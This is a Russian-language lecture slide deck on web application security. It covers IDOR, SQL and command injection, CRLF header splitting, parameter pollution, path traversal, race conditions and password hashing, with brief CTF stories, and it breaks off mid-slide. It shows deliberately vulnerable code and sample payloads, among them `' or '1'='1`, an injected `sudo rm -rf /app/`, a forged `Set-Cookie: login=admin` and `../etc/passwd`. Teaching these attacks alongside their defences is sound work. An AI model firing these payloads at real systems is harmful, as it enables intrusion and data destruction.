<!doctype html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <title>–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="../../@lib/core.css">
    <link rel="stylesheet" href="../../@lib/theme.css">
    <link rel="stylesheet" href="index.css">
</head>
<body class="white"><div class="reveal"><div class="slides">

<section class="center">
    <h1>–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å <span class="one-line">–≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π</span></h1>
    <h2 class="author">–ê–ª–µ–∫—Å–∞–Ω–¥—Ä –ë–µ–ª—ë–≤</h2>
</section>

<section class="center">
    <h1>–ü–æ—á–µ–º—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å&mdash;&nbsp;—ç—Ç–æ –≤–∞–∂–Ω–æ?</h1>
</section>

<section class="center car image"></section>

<section class="center theory image">
    <div class="theory__wrapper"></div>
</section>

<section class="center">
    <dl>
        <dt class="term">–£–≥—Ä–æ–∑–∞</dt>
        <dd class="fragment definition">
            –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –≤–æ–∑–º–æ–∂–Ω–æ–µ <strong>—Å–æ–±—ã—Ç–∏–µ</strong>, –∫–æ—Ç–æ—Ä–æ–µ –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º —Ä–∞–±–æ—Ç—ã —Å&nbsp;–∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏ —Å–µ—Ä–≤–∏—Å–∞, –º–æ–∂–µ—Ç –Ω–∞–Ω–µ—Å—Ç–∏ <strong>—É—â–µ—Ä–±</strong>
        </dd>
    </dl>
</section>

<section class="center">
    <dl>
        <dt class="term">–£—è–∑–≤–∏–º–æ—Å—Ç—å</dt>
        <dd class="fragment definition">
            <strong>–°–≤–æ–π—Å—Ç–≤–æ</strong> —Å–µ—Ä–≤–∏—Å–∞, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–≥–æ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–æ–º –ø—Ä–∏–≤–æ–¥–∏—Ç –∫&nbsp;<strong>—Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —É–≥—Ä–æ–∑—ã</strong>
        </dd>
    </dl>
</section>

<section class="center">
    <dl>
        <dt class="term">–ê—Ç–∞–∫–∞</dt>
        <dd class="fragment definition">
            <strong>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —É–≥—Ä–æ–∑—ã</strong>, –ø—É—Ç—ë–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
        </dd>
    </dl>
</section>

<section class="center">
    <img src="./images/03-owasp.jpg" alt="OWASP">
    <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>
</section>

<section class="center">
    <h1>–ß—Ç–æ –º—ã –∑–∞—â–∏—â–∞–µ–º?</h1>
</section>

<section class="center">
    <img src="./images/01-schema.jpg" alt="–°—Ö–µ–º–∞ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã —Å–æ–≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è">
</section>

<section class="vulnerabilities-slide">
    <div class="vulnerabilities">
        <h2 class="fly color-black fragment">Server-side</h2>
        <h2 class="chop color-black fragment">Client-side</h2>
    </div>
</section>

<section>
    <h1>–°–µ—Ä–≤–µ—Ä–Ω–∞—è —á–∞—Å—Ç—å</h1>
    <ul class="list">
        <li class="fragment">
            <span class="left">–õ–æ–≥–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</span>
            <br>
            <span class="xxsmall left">–Ω–µ–¥–æ—á–µ—Ç—ã –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã</span>
        </li>
        <li class="fragment">
            <span class="left">–û—à–∏–±–∫–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏</span>
            <br>
            <span class="xxsmall left">–æ—à–∏–±–∫–∏ –≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–∏</span></li>
        <li class="fragment">
            <span class="left">–û—à–∏–±–∫–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</span>
            <br>
            <span class="xxsmall left">–æ—à–∏–±–∫–∏ –≤ –∫–æ–¥–µ</span></li>
        </li>
    </ul>
</section>

<section>
    <h1>–õ–æ–≥–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h1>
    <ul class="list">
        <li class="fragment">–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —Ä–∞–∑–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞</li>
        <li class="fragment">–ò–∑–±—ã—Ç–æ—á–Ω–∞—è –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å</li>
    </ul>
</section>

<section>
    <h1 class="small">–°–µ–∫—Ä–µ—Ç–Ω—ã–π —É—Ä–ª</h1>
    <pre><code class="hljs nginx">
        GET https://my-awesome-site.ru/admin</code></pre>
    <pre class="fragment"><code class="hljs nginx">
        GET https://my-awesome-site.ru/aliSFla1434snf</code>
    </pre>
    <p class="fragment xxsmall">–ß–∞—â–µ –≤—Å–µ–≥–æ —Ç–∞–∫–∞—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–∞</p>
</section>

<section>
    <img src="images/04-docs.png" alt="–ò–Ω–¥–µ–∫—Å–∞—Ü–∏—è GoogleDocs">
</section>

<section>
    <h1>–õ–æ–≥–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h1>
    <ul class="list">
        <li>–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —Ä–∞–∑–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞</li>
        <li>–ò–∑–±—ã—Ç–æ—á–Ω–∞—è –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å</li>
        <li class="fragment">–ù–∞—Ä—É—à–µ–Ω–∏–µ –ª–æ–≥–∏–∫–∏ —Ä–∞–±–æ—Ç—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</li>
    </ul>
</section>

<section>
    <h1 class="small">–§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –æ–ø–ª–∞—Ç—ã</h1>
    <span class="payment-step">–í—ã–±–∏—Ä–∞–µ–º —Å–ø–æ—Å–æ–± –æ–ø–ª–∞—Ç—ã</span>
    <pre data-noescape data-trim><code class="hljs nginx">    GET https://online-shop.ru/payment/step/1</code></pre>
    <div class="fragment">
        <span class="payment-step">–ü—Ä–æ–∏–∑–≤–æ–¥–∏–º –æ–ø–ª–∞—Ç—É</span>
        <pre data-noescape data-trim><code class="hljs nginx">    GET https://online-shop.ru/payment/step/2</code></pre>
    </div>
    <div class="fragment">
        <span class="payment-step">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ–º –ø–æ –°–ú–°</span>
        <pre data-noescape data-trim><code class="hljs nginx">    GET https://online-shop.ru/payment/step/3</code></pre>
    </div>
    <div class="fragment">
        <span class="payment-step">–ü–æ–ª—É—á–∞–µ–º —Ç–æ–≤–∞—Ä</span>
        <pre data-noescape data-trim><code class="hljs nginx">    GET https://online-shop.ru/payment/step/4</code></pre>
    </div>
</section>

<section>
    <h1 class="small">Insecure direct object reference</h1>
    <div class="fragment">
        <pre data-noescape data-trim><code class="hljs left nginx">
    GET https://disk.yandex.ru/client/1028379420</code></pre>
        <pre data-noescape data-trim><code class="hljs left nginx">    GET https://disk.yandex.ru/client/123</code>
        </pre>
    </div>
</section>

<section>
    <h1 class="small">Insecure direct object reference</h1>
    <pre data-noescape data-trim><code class="hljs left nginx" data-noescape>
    GET https://disk.yandex.ru/client/<mark>1028379420</mark></code></pre>
    <pre data-noescape data-trim><code class="hljs left nginx" data-noescape>    GET https://disk.yandex.ru/client/<mark>123</mark></code>
    </pre>
    <p class="xxsmall fragment">–ï—Å—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</p>
</section>

<section>
    <h1>–ü—Ä–µ–¥–ø–æ—Å—ã–ª–∫–∏</h1>
    <ul class="list">
        <li class="fragment">–°–ª–æ–∂–Ω–æ—Å—Ç–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</li>
        <li class="fragment">–ü–ª–æ—Ö–æ –ø—Ä–æ–¥—É–º–∞–Ω–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞</li>
        <li class="fragment">–ß–µ–ª–æ–≤–µ—á–µ—Å–∫–∏–π —Ñ–∞–∫—Ç–æ—Ä</li>
    </ul>
</section>

<section>
    <h1>–û—à–∏–±–∫–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</h1>
    <ul class="list">
        <li class="fragment">–ò–Ω—ä–µ–∫—Ü–∏–∏</li>
        <li class="fragment">–ì–æ–Ω–∫–∏ (Race condition)</li>
        <li class="fragment">–†–∞—Å–∫—Ä—ã—Ç–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</li>
        <li class="fragment">–°–ª–∞–±–∞—è –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—è</li>
        <li class="fragment">–ë–∏–Ω–∞—Ä–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</li>
    </ul>
</section>

<section class="center">
    <dl>
        <dt class="term">–ò–Ω—ä–µ–∫—Ü–∏–∏</dt>
        <dd class="fragment definition">
            <strong>–£—è–∑–≤–∏–º–æ—Å—Ç–∏</strong>, –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ –Ω–∞ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å <strong>–≤–Ω–µ–¥—Ä–µ–Ω–∏—è</strong> —É–ø—Ä–∞–≤–ª—è—é—â–µ–≥–æ –∫–æ–¥–∞ –≤ —è–∑—ã–∫ –∑–∞–ø—Ä–æ—Å–æ–≤
        </dd>
    </dl>
</section>

<section>
    <h1>–ò–Ω—ä–µ–∫—Ü–∏–∏</h1>
    <ul class="list">
        <li class="fragment">SQL/NoSQL injection</li>
        <li class="fragment">Command injection</li>
        <li class="fragment">CRLF injection</li>
        <li class="fragment">Parameter contamination</li>
        <li class="fragment">Path traversal</li>
    </ul>
</section>

<section>
    <h1>
        SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
        <span class="crone">üëë</span>
    </h1>
    <pre class="fragment"><code class="hljs typescript left" data-noescape data-trim>
        const { id } = req.query;

        const sql = `SELECT * FROM adventures WHERE id='${id}';`;
    </code></pre>
    <pre class="fragment">
        <code class="hljs nginx" data-noescape data-trim>
        GET /adventures?id=123
    </code></pre>
    <pre class="fragment">
        <code class="hljs sql" data-noescape data-trim>
        SELECT * FROM adventures WHERE id='123';
    </code></pre>
</section>

<section>
    <h1>
        SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
        <span class="crone">üëë</span>
    </h1>
    <pre>
        <code class="hljs nginx" data-noescape data-trim>
        GET /adventures?id=123
    </code></pre>
</section>

<section>
    <h1>
        SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
        <span class="crone">üëë</span>
    </h1>
    <pre>
        <code class="hljs nginx" data-noescape data-trim>
        GET /adventures?id=123' or '1'='1
    </code></pre>
    <pre class="fragment">
        <code class="hljs sql" data-noescape data-trim>
        SELECT * FROM adventures WHERE id='<mark>123' or '1'='1</mark>';
    </code></pre>
    <pre class="fragment">
        <code class="hljs nginx" data-noescape data-trim>
        GET /adventures?id=123%27%20or%20%271%27=%271
    </code></pre>
</section>

<section class="center">
    <h1>
        SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
        <span class="crone">üëë</span>
    </h1>
    <img src="./images/12-what.jpg" alt="–ß—Ç–æ –¥–µ–ª–∞—Ç—å?" class="what-to-do">
</section>

<section>
    <h1>
        SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
        <span class="crone">üëë</span>
    </h1>
    <ul class="list">
        <li class="fragment">–°–∞–Ω–∏—Ç–∞–π–∑–∏—Ç—å / —ç—Å–∫–µ–π–ø–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</li>
        <li class="fragment">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ORM</li>
        <li class="fragment">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å prepared statements</li>
    </ul>
</section>

<section>
    <h1 class="small">–≠—Å–∫–µ–π–ø–∏–Ω–≥</h1>
    <pre><code class="hljs typescript" data-trim>
    const { name } = req.body;
    const escaped = name.replace('\'', '\'\'');

    const sql = `
        SELECT * FROM adventures WHERE name='${escaped}';
    `;</code></pre>
    <p class="xsmall fragment">–†–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ <strong>–≤ —á–∞—Å—Ç–Ω–æ–º —Å–ª—É—á–∞–µ</strong></p>
    <p>
    <a class="xsmall fragment" href="https://wiki.owasp.org/index.php/SQL_Injection_Bypassing_WAF">SQL Injection Bypassing WAF</a>
    </p>
</section>

<section>
    <h1 class="small">Prepared statements</h1>
    <pre><code class="hljs sql" data-noescape data-trim>    PREPARE findAdventure (text) AS
        SELECT * FROM adventures WHERE name = $1;
    EXECUTE findAdventure('magic');</code></pre>
    <pre class="fragment"><code class="hljs typescript" data-trim>    const { name } = req.body;

    sequelize
        .query('SELECT * FROM adventures WHERE name = :name', {
            replacements: { name },
            type: sequelize.QueryTypes.SELECT
        })
        .then(adventures => res.send(adventures));</code></pre>
    <p class="xsmall fragment">
        <a target="_blank" href="https://www.postgresql.org/docs/Ôºô.6/sql-prepare.html">
            Prepared statements –≤ PostgreSQL
        </a>
    </p>
</section>

<section>
    <h1 class="small">Command injection üêΩ</h1>
    <pre class="fragment"><code class="hljs typescript" data-noescape data-trim>    import { exec } from 'child_process';</code></pre>
    <pre class="fragment"><code class="hljs typescript" data-noescape data-trim>    const { repo, name } = req.body;
    </code></pre>
    <pre class="fragment"><code class="hljs typescript" data-noescape data-trim>    exec(`git clone ${repo}`);
    exec(`cd ${name}`);
    exec('npm install');
    exec('npm test');</code></pre>
    <pre class="fragment"><code class="hljs nginx" data-noescape data-trim>    POST /hook</code><code class="hljs typescript" data-noescape data-trim>    {
        repo: 'https://github.com/urfu-2019/telltail.git',
        name: 'telltail'
    }</code></pre>
</section>

<section>
    <h1 class="small">Command injection üêΩ</h1>
    <pre><code class="hljs typescript" data-noescape data-trim>    import { exec } from 'child_process';</code></pre>
    <pre><code class="hljs typescript" data-noescape data-trim>    const { repo, name } = req.body;
    </code></pre>
    <pre><code class="hljs typescript" data-noescape data-trim>    exec(`git clone ${repo}`); // ü§î
    exec(`cd ${name}`); // ü§î
    exec('npm install');
    exec('npm test');</code></pre>
    <pre><code class="hljs nginx" data-noescape data-trim>    POST /hook</code><code class="hljs typescript" data-noescape data-trim>    {
        repo: 'https://github.com/urfu-2019/telltail.git',
        name: 'telltail'
    }</code></pre>
</section>

<section>
    <h1 class="small">Command injection</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>    POST /hook</code><code class="hljs typescript" data-noescape data-trim>    {
        repo: 'https://github.com/urfu-2019/telltail.git',
        name: 'telltail && sudo rm -rf /app/'
    }</code></pre>
    <pre class="fragment"><code class="hljs typescript" data-noescape data-trim>        exec('cd telltail && sudo rm -rf /app/')</code></pre>
</section>

<section>
    <h1 class="small">Command injection</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>    POST /hook</code><code class="hljs typescript" data-noescape data-trim>    {
        repo: 'https://github.com/urfu-2019/telltail.git',
        name: 'telltail && sudo rm -rf /app/'
    }</code></pre>
    <pre><code class="hljs typescript" data-noescape data-trim>        exec('cd <mark>telltail && sudo rm -rf /app/</mark>')</code></pre>
</section>

<section>
    <h1 class="small">Command injection</h1>
    <ul class="list">
        <li class="fragment">–†–∞–∑–±–∏–≤–∞—Ç—å —Å–µ—Ä–≤–∏—Å –Ω–∞ –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã</li>
        <li class="fragment">–ù–µ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã</li>
        <li class="fragment">–ù–µ –∑–∞–ø—É—Å–∫–∞—Ç—å –Ω–æ–≤—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤</li>
        <li class="fragment">–ò–∑–æ–ª–∏—Ä–æ–≤–∞—Ç—å –∑–∞–ø—É—Å–∫–∞–µ–º—ã–π –∫–æ–¥</li>
    </ul>
</section>

<section>
    <h1 class="small">CRLF Injection</h1>
    <p class="xsmall">–ü—Ä–æ–∫—Å–∏—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å –≤ –±—ç–∫–µ–Ω–¥</p>
    <pre class="fragment"><code class="hljs typescript" data-noescape data-trim>CR === '\r' === String.fromCharCode(0x0d)</code></pre>
    <pre class="fragment"><code class="hljs typescript" data-noescape data-trim>LF === '\n' === String.fromCharCode(0x0a)</code></pre>
</section>

<section>
    <h1 class="small">HTTP Header Splitting</h1>
    <pre><code class="hljs nginx">GET /path?redirect=home%0D%0ASet-Cookie:%20login%3Dadmin HTTP/1.1</code></pre>
</section>

<section>
    <h1 class="small">HTTP Header Splitting</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>GET /path?redirect=home<mark>%0D%0ASet-Cookie:%20login%3Dadmin</mark> HTTP/1.1</code></pre>
    <pre><code class="fragment code hljs" data-noescape="" data-trim="">HTTP/1.1 302\r\n
Location: /home\r\n
Set-Cookie: login=admin\r\n
    </code></pre>
</section>

<section>
    <h1 class="small">HTTP Header Splitting</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>GET /path?redirect=home<mark>%0D%0ASet-Cookie:%20login%3Dadmin</mark> HTTP/1.1</code></pre>
    <pre><code class="hljs" data-noescape="" data-trim="">HTTP/1.1 302\r\n
Location: /home<mark>\r\n
Set-Cookie: login=admin</mark>\r\n
    </code></pre>
</section>

<section>
    <h1 class="small">HTTP parameter contamination</h1>
    <pre class="fragment">
        <code class="hljs nginx">
GET /handle?payload=1%26login=admin</code></pre>
    <pre class="fragment"><code class="hljs nginx">
GET /handle?payload=1&login=admin&login=user</code></pre>
</section>

<section>
    <h1 class="small">HTTP parameter contamination</h1>
    <pre>
    <code class="hljs nginx">
GET /handle?payload=1%26login=admin</code></pre>
    <pre><code class="hljs nginx" data-noescape>
GET /handle?payload=<mark>1&login=admin</mark>&login=user</code>
</pre>
    <p class="xsmall fragment">–ò–Ω—ä–µ–∫—Ü–∏—è –≤ GET-–ø–∞—Ä–∞–º–µ—Ç—Ä–µ <strong>payload</strong></p>
</section>

<section>
    <h1>Path traversal</h1>
    <pre class="fragment"><code class="hljs nginx">
    GET /handler?filename=image.jpg</code></pre>
    <pre class="fragment"><code class="hljs nginx">
    GET /handler?filename=../../../../../etc/passwd</code>
    </pre>
</section>

<section>
    <h1 class="center">–ö—É–ª —Å—Ç–æ—Ä–∏</h1>
    <p class="center">VolgaCTF 2019 Quals</p>
    <p class="fragment">
        <a href="https://kappactf.ru/2019-04-01-volgactf-gallery-ru/">Writeup –æ—Ç Kappa</a>
    </p>
</section>

<section>
        <p class="fragment">–ì–∞–ª–µ—Ä–µ—è, –Ω–∞–ø–∏—Å–∞–Ω–∞ –Ω–∞ node.js</p>
        <p class="fragment">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è <a href="https://www.npmjs.com/package/session-file-store">session-file-store</a></p>
        <p class="fragment">–° –ø–æ–º–æ—â—å—é directory listing —Å–∫–∞—á–∞–ª–∏ config —Å —Å–µ–∫—Ä–µ—Ç–Ω—ã–º –∫–ª—é—á–æ–º</p>
        <p class="fragment"><img src="./images/secret_key.png" alt=""></p>
</section>

<section>
    <p class="fragment" data-fragment-index="0">–¢–∞–º –∂–µ –µ—Å—Ç—å API, —á–∏—Ç–∞—é—â–µ–µ —Ñ–∞–π–ª—ã, —Å path traversal</p>
        <p class="fragment" data-fragment-index="1">–†—è–¥–æ–º –ª–µ–∂–∞–ª –∫–æ–¥ –∞–¥–º–∏–Ω–∫–∏ —Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω–æ–π —Å–µ—Å—Å–∏–µ–π</p>
        <p class="fragment" data-fragment-index="2"><img src="./images/adminpanel_sessions.png" alt=""></p>
        <p class="fragment" data-fragment-index="3">ID —Å–µ—Å—Å–∏–∏ ‚Äî —ç—Ç–æ –∏–º—è —Ñ–∞–π–ª–∞</p>
</section>

<section>
    <p class="fragment" data-fragment-index="3">–°–æ–∑–¥–∞–µ–º –∫—É–∫—É —Å ID=</p>
    <span class="fragment" data-fragment-index="3"><pre><code class="hljs">../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM</code></pre></span>
    <p class="fragment">–ü–æ–¥–ø–∏—Å—ã–≤–∞–µ–º –∫—É–∫—É —É–∫—Ä–∞–¥–µ–Ω–Ω—ã–º –∫–ª—é—á–æ–º</p>
    <p class="fragment">–ó–∞–±–∏—Ä–∞–µ–º —Ñ–ª–∞–≥</p>
    <div class="fragment"><img src="./images/final.png" alt=""></div>
</section>

<section>
    <h1 class="small">–ö–∞–∫ –∑–∞—â–∏—â–∞—Ç—å—Å—è</h1>
        <ul class="list">
            <li class="fragment">–ù–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É</li>
            <li class="fragment">–ù–µ—Ç, —è —Å–µ—Ä—å–µ–∑–Ω–æ, –æ–Ω–æ –≤–∞–º –Ω–µ –Ω—É–∂–Ω–æ</li>
            <li class="fragment">–í –∫—Ä–∞–π–Ω–µ–º —Å–ª—É—á–∞–µ ‚Äî —Å–∞–Ω–∏—Ç–∞–π–∑–∏–Ω–≥ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤</li>
        </ul>
</section>

<section class="center">
    <img src="./images/23-ostrich.jpg" alt="–ü–µ—Ä–µ—Ä—ã–≤?">
</section>

<section>
    <h1 class="small">Race conditions (–≥–æ–Ω–∫–∏)</h1>
    <pre class="fragment"><code class="hljs typescript left" data-noescape data-trim>
    const { code } = req.body;

    const isValid = await PromoCode.validate(code);

    if (!isValid) {
        return;
    }

    await PromoCode.activate(code);
    await PromoCode.markAsUsed(code);</code></pre>
</section>

<section>
    <h1 class="small">Race conditions (–≥–æ–Ω–∫–∏)</h1>
    <pre><code class="hljs typescript left" data-noescape data-trim>
    const { code } = req.body;

    const isValid = await PromoCode.validate(code);

    if (!isValid) {
        return;
    }

    await PromoCode.activate(code);
    await PromoCode.markAsUsed(code); // ‚è∞</code></pre>
    <p class="fragment xsmall">–ù—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å <strong>—Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏</strong></p>
</section>

<section>
    <h1 class="small">–†–∞—Å–∫—Ä—ã—Ç–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</h1>
    <ul class="list">
        <li class="fragment">–ó–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–∞ –≤ –æ—Ç–≤–µ—Ç–µ —Å–µ—Ä–≤–µ—Ä–∞</li>
        <li class="fragment">–°—Å—ã–ª–∫–∏ –Ω–∞ –≤–Ω—É—Ç—Ä–µ–Ω–Ω—é—é –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é / –æ–ø–∏—Å–∞–Ω–∏–µ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏—Ö —Å—Ç—Ä—É–∫—Ç—É—Ä</li>
        <li class="fragment">–Ø–∑—ã–∫ –∏ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫</li>
        <li class="fragment">–û—Ç–ª–∞–¥–æ—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ production</li>
        <li class="fragment">–ù–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ</li>
    </ul>
</section>

<section>
    <h1>–ö—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—è</h1>
    <ul class="list">
        <li class="fragment">–ö—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—è !== –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å</li>
        <li class="fragment">&laquo;–ü–æ—Å–ª–µ–¥–Ω–∏–π —Ä—É–±–µ–∂&raquo;</li>
        <li class="fragment">–ù–∏–∫–æ–≥–¥–∞ –Ω–µ –ø–∏—Å–∞—Ç—å —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ</li>
    </ul>
</section>

<section>
    <h1>–ü–∞—Ä–æ–ª–∏</h1>
    <table class="table">
        <tr>
            <th>User</th>
            <th>Password</th>
        </tr>
        <tr>
            <td>user1</td>
            <td>qwertyuiop</td>
        </tr>
    </table>
</section>

<section>
    <h1>–ü–∞—Ä–æ–ª–∏</h1>
    <table class="table">
        <tr>
            <th>User</th>
            <th>Password</th>
        </tr>
        <tr>
            <td>user1</td>
            <td>hash('qwertyuiop')</td>
        </tr>
    </table>
</section>

<section>
    <h1>–•–µ—à-—Ñ—É–Ω–∫—Ü–∏—è</h1>
    <ul class="list">
        <li class="fragment">–û–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω—è—è —Ñ—É–Ω–∫—Ü–∏—è</li>
        <li class="fragment">–í—Ö–æ–¥ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–π –¥–ª–∏–Ω—ã, –≤—ã—Ö–æ–¥ ‚Äî —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–π</li>
        <li class="fragment">–°—Ç–æ–π–∫–æ—Å—Ç—å –∫ –∫–æ–ª–ª–∏–∑–∏—è–º, –≤–∑—è—Ç–∏—é –≤—Ç–æ—Ä–æ–≥–æ –ø—Ä–æ–æ–±—Ä–∞–∑–∞</li>
        <li class="fragment">MD5, SHA-256, SHA-512, Streebog</li>
    </ul>
</section>

<section>
    <h1>–ü–∞—Ä–æ–ª–∏</h1>
    <table class="table">
        <tr>
            <th>User</th>
            <th>Password</th>
        </tr>
        <tr>
            <td>user1</td>
            <td>hash('qwertyuiop'+salt)</td>
        </tr>
    </table>
</section>

<section>
    <h1>–ü–∞—Ä–æ–ª–∏</h1>
    <table class="table">
        <tr>
            <th>User</th>
            <th>Salt</th>
            <th>Password</th>
        </tr>
        <tr>
            <td>user1</td>
            <td>secret</td>
            <td>hash('qwertyuiop'+salt)</td>
        </tr>
    </table>
</section>

<section>
    <h1>–ö—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—è</h1>
    <ul class="list">
        <li>–ö—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—è !== –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å</li>
        <li>&laquo;–ü–æ—Å–ª–µ–¥–Ω–∏–π —Ä—É–±–µ–∂&raquo;</li>
        <li>–ù–∏–∫–æ–≥–¥–∞ –Ω–µ –ø–∏—Å–∞—Ç—å —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ</li>
        <li>–ù–µ —Ö—Ä–∞–Ω–∏—Ç—å –ø–∞—Ä–æ–ª–∏ –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ</li>
        <li>–ü—Ä–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–æ–ª—å</li>
    </ul>
</section>

<section class="center">
    <h1>–ö—É–ª —Å—Ç–æ—Ä–∏ #2</h1>
    <p class="xsmall">RuCTF 2019</p>
</section>

<section class="center">
    <img src="./images/cookie_gen.png" alt="">
    <p class="fragment">–°–ª–µ–¥—É—é—â–∞—è –∫—É–∫–∞ = MD5 –æ—Ç –ø—Ä–µ–¥—É–¥—ã—â–µ–π</p>
</section>

<section class="center">
